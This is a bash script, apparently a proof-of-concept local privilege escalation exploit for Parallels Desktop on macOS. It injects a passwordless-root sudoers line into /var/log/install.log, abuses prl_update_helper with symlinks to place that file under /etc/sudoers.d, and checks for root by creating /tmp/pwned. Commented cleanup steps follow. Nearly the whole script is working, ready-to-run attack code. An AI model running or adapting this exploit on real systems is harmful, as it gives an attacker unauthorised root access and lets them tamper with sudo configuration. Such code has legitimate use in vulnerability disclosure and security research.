#!/bin/bash

TARGET_FILE=/var/log/install.log

# Write valid sudoers syntax into the install.log
logger -p install.error $(printf "\r$USER ALL=(ALL) NOPASSWD: ALL")

if [ -L ~/Library/Parallels ]; then
    echo "[*] Deleting existing ~/Library/Parallels symlink"
    rm ~/Library/Parallels
fi

if [ -L ~/Library/Parallels~ ]; then
    echo "[*] Deleting existing ~/Library/Parallels~ symlink"
    rm ~/Library/Parallels~
fi

if [ -d ~/Library/Parallels ]; then
    echo "[*] Backing up Parallels directory"
    if [ -e ~/Library/Parallels.bak ]; then
        echo "[!] Backup exists, not overwriting"
        exit 1
    fi
    mv ~/Library/Parallels{,.bak} 
fi

# Set up the symlinks which will be used in the mv
echo "[*] Creating symlinks"
ln -s $TARGET_FILE ~/Library/Parallels 
ln -s /etc/sudoers.d ~/Library/Parallels~ 

echo "[*] Moving symlink into position with prl_update_helper" 
/Applications/Parallels\ Desktop.app/Contents/MacOS/prl_update_helper /Applications/Parallels\ Desktop.app/ >/dev/null 2>&1

if [ ! -L /etc/sudoers.d/Parallels ]; then
    echo "[!] Symlink wasn't created, check TARGET_FILE actually exists and prl_update_helper is vulnerable"
    exit 1
fi

echo "[*] Touching /tmp/pwned as root, this may take a few minutes while sudo parses the log file..."
sudo touch /tmp/pwned 2>/dev/null

# Check if it worked
if [ -f /tmp/pwned ] && [ "$(stat -f '%u' /tmp/pwned)" -eq 0 ]; then
  echo "[*] Success :)"
  ls -la /tmp/pwned
else
  echo "[!] Failed"
fi



# To tidy up:
# rm ~/Library/Parallels
# mv ~/Library/Parallels{.bak,}
# rm ~/Library/Parallels~
# sudo rm /etc/sudoers.d/Parallels
